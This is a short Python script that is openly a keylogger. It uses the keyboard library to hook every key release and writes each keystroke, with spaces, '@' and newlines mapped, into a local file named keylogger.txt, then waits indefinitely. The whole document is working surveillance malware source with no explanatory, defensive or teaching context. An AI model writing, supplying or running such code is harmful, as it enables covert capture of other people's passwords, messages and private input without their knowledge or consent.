import keyboard
our_file = open("keylogger.txt","w")
def new_key(event):
    button = event.name
    if button == "space":
        button = " "
    elif button == "shift2":
        button = "@" 
    elif button == "enter":
        button = "\n"
    our_file.write(button)
    our_file.flush()

keyboard.on_release(callback=new_key)
keyboard.wait()